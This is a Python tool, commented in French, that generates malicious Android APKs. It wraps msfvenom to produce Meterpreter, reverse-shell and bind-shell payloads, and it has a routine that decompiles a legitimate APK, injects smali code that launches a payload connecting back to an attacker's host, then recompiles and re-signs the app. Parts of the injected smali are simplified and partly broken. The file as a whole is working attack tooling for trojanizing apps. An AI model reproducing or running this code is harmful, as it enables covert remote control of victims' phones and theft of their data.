#!/usr/bin/env python3
"""
Android APK Payload Generator
- Meterpreter for Android
- Reverse shells
- Bind shells
- APK backdooring
"""

import os
import subprocess
import tempfile
import shutil
from typing import Optional, Dict, List

class AndroidPayloads:
    """
    Générateur de payloads Android (APK)
    """
    
    MSF_PAYLOADS = {
        'meterpreter': 'android/meterpreter/reverse_tcp',
        'meterpreter_https': 'android/meterpreter/reverse_https',
        'meterpreter_http': 'android/meterpreter/reverse_http',
        'reverse_tcp': 'android/shell/reverse_tcp',
        'bind_tcp': 'android/shell/bind_tcp',
    }
    
    def __init__(self, use_msf: bool = True):
        self.use_msf = use_msf
        self.keystore_path = os.path.expanduser("~/.android/debug.keystore")
    
    def meterpreter_reverse_tcp(self, lhost: str, lport: int, output_apk: str) -> bool:
        """
        Génère un APK Meterpreter
        """
        if not self.use_msf:
            return False
        
        return self._generate_apk('meterpreter', lhost, lport, output_apk)
    
    def meterpreter_https(self, lhost: str, lport: int, output_apk: str) -> bool:
        """
        Meterpreter over HTTPS (plus furtif)
        """
        return self._generate_apk('meterpreter_https', lhost, lport, output_apk)
    
    def reverse_tcp(self, lhost: str, lport: int, output_apk: str) -> bool:
        """
        Reverse shell simple
        """
        return self._generate_apk('reverse_tcp', lhost, lport, output_apk)
    
    def bind_tcp(self, lport: int, output_apk: str) -> bool:
        """
        Bind shell (écoute sur le port)
        """
        return self._generate_apk('bind_tcp', '', lport, output_apk)
    
    def inject_into_apk(self, original_apk: str, lhost: str, lport: int, output_apk: str) -> bool:
        """
        Injecte un payload dans une APK légitime
        """
        try:
            # Vérifier que les outils nécessaires sont installés
            if not self._check_tools():
                print("[!] apktool, keytool, or apksigner not found")
                return False
            
            # 1. Décompiler l'APK
            with tempfile.TemporaryDirectory() as temp_dir:
                print(f"[*] Décompilation de {original_apk}...")
                result = subprocess.run(
                    ['apktool', 'd', original_apk, '-o', f'{temp_dir}/decompiled', '-f'],
                    capture_output=True,
                    text=True
                )
                
                if result.returncode != 0:
                    print(f"[!] apktool error: {result.stderr}")
                    return False
                
                # 2. Générer le payload
                payload = self._generate_raw_payload('meterpreter', lhost, lport)
                
                # 3. Injecter dans smali
                print("[*] Injection du payload...")
                self._inject_smali(f'{temp_dir}/decompiled/smali', payload, lhost, lport)
                
                # 4. Recompiler
                print("[*] Recompilation...")
                result = subprocess.run(
                    ['apktool', 'b', f'{temp_dir}/decompiled', '-o', f'{temp_dir}/unsigned.apk'],
                    capture_output=True,
                    text=True
                )
                
                if result.returncode != 0:
                    print(f"[!] apktool build error: {result.stderr}")
                    return False
                
                # 5. Signer l'APK
                print("[*] Signature de l'APK...")
                if not self._sign_apk(f'{temp_dir}/unsigned.apk', output_apk):
                    return False
                
            print(f"[✓] APK backdoorée générée: {output_apk}")
            return True
            
        except Exception as e:
            print(f"[!] APK injection error: {e}")
            return False
    
    def _generate_apk(self, payload_key: str, lhost: str, lport: int, output_apk: str) -> bool:
        """
        Génère une APK avec msfvenom
        """
        try:
            payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
            
            cmd = ['msfvenom', '-p', payload]
            if lhost:
                cmd.append(f'LHOST={lhost}')
            cmd.append(f'LPORT={lport}')
            cmd.extend(['-o', output_apk])
            
            print(f"[*] Exécution: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[✓] APK générée: {output_apk}")
                return True
            else:
                print(f"[!] msfvenom error: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[!] Error: {e}")
            return False
    
    def _generate_raw_payload(self, payload_key: str, lhost: str, lport: int) -> bytes:
        """
        Génère le payload brut
        """
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw']
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""
    
    def _inject_smali(self, smali_dir: str, payload: bytes, lhost: str, lport: int):
        """
        Injecte le payload dans les fichiers smali
        """
        main_activity = None
        
        # Chercher le point d'entrée principal (MainActivity)
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if 'MainActivity' in file and file.endswith('.smali'):
                    main_activity = os.path.join(root, file)
                    break
            if main_activity:
                break
        
        if not main_activity:
            # Prendre le premier fichier smali trouvé
            for root, dirs, files in os.walk(smali_dir):
                for file in files:
                    if file.endswith('.smali'):
                        main_activity = os.path.join(root, file)
                        break
                if main_activity:
                    break
        
        if main_activity:
            print(f"[*] Modification de {main_activity}")
            
            # Ajouter l'appel au payload dans onCreate
            with open(main_activity, 'a', encoding='utf-8') as f:
                f.write("\n\n")
                f.write("# Payload injection by OrVex\n")
                f.write(".method private startPayload()V\n")
                f.write("    .locals 2\n\n")
                f.write("    :try_start\n")
                f.write("    new-instance v0, Ljava/lang/Thread;\n")
                f.write("    new-instance v1, Lorg/orvex/Payload;\n")
                f.write("    invoke-direct {v1}, Lorg/orvex/Payload;-><init>()V\n")
                f.write("    invoke-virtual {v0, v1}, Ljava/lang/Thread;->start()V\n")
                f.write("    :try_end\n")
                f.write("    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0\n")
                f.write("    :catch_0\n")
                f.write("    return-void\n")
                f.write(".end method\n\n")
                
                # Appeler startPayload dans onCreate
                f.write(".method public onCreate(Landroid/os/Bundle;)V\n")
                f.write("    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n")
                f.write("    invoke-virtual {p0}, Lorg/orvex/MainActivity;->startPayload()V\n")
                f.write("    return-void\n")
                f.write(".end method\n")
            
            # Créer la classe Payload
            payload_class = os.path.join(os.path.dirname(main_activity), 'Payload.smali')
            with open(payload_class, 'w', encoding='utf-8') as f:
                f.write(self._generate_payload_smali(payload, lhost, lport))
            
            print(f"[✓] Payload injecté dans {main_activity}")
    
    def _generate_payload_smali(self, payload: bytes, lhost: str, lport: int) -> str:
        """
        Génère une classe smali avec le payload
        """
        # Convertir payload en format smali
        if payload:
            payload_array = ', '.join(f'0x{b:02x}' for b in payload[:20])
            if len(payload) > 20:
                payload_array += f', ... ({len(payload)} bytes total)'
        else:
            payload_array = ''
        
        smali = f""".class public Lorg/orvex/Payload;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# Connection info
.field private static final LHOST:Ljava/lang/String; = "{lhost}"
.field private static final LPORT:I = {lport}

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .locals 6

    :try_start
    # Connect to C2 server
    const-string v0, "LHOST"
    const-string v0, "{lhost}"
    
    # Execute payload (simplifié)
    invoke-static {{}}, Lorg/orvex/Payload;->executeNative()V
    
    :try_end
    .catch Ljava/lang/Exception; {{}}
    return-void
.end method

.method private static native executeNative()V
.end method

# Payload data
.field private static final PAYLOAD:[B
    .array-data 1
        {payload_array}
    .end array-data
.end field

# Load native library
.method static constructor <clinit>()V
    .locals 1
    const-string v0, "orvex"
    invoke-static {{v0}}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
    return-void
.end method
"""
        return smali
    
    def _check_tools(self) -> bool:
        """
        Vérifie que les outils nécessaires sont installés
        """
        tools = ['apktool', 'keytool', 'apksigner']
        missing = []
        
        for tool in tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"[!] Outils manquants: {', '.join(missing)}")
            print("    Installez: sudo apt install apktool openjdk-11-jdk")
            return False
        
        return True
    
    def _sign_apk(self, unsigned_apk: str, signed_apk: str) -> bool:
        """
        Signe l'APK avec un keystore debug
        """
        # Créer keystore si nécessaire
        keystore_dir = os.path.dirname(self.keystore_path)
        if not os.path.exists(keystore_dir):
            os.makedirs(keystore_dir, exist_ok=True)
        
        if not os.path.exists(self.keystore_path):
            print("[*] Création du keystore debug...")
            cmd = [
                'keytool', '-genkey', '-v',
                '-keystore', self.keystore_path,
                '-alias', 'debug',
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', 'android',
                '-keypass', 'android',
                '-dname', 'CN=Android Debug, OU=Debug, O=Android, L=Unknown, ST=Unknown, C=US'
            ]
            subprocess.run(cmd, capture_output=True)
        
        # Signer avec apksigner
        cmd = [
            'apksigner', 'sign',
            '--ks', self.keystore_path,
            '--ks-pass', 'pass:android',
            '--key-pass', 'pass:android',
            '--out', signed_apk,
            unsigned_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[✓] APK signée: {signed_apk}")
            return True
        else:
            print(f"[!] Signature error: {result.stderr}")
            return False
    
    def get_payload_list(self) -> list:
        """Retourne la liste des payloads disponibles"""
        return list(self.MSF_PAYLOADS.keys())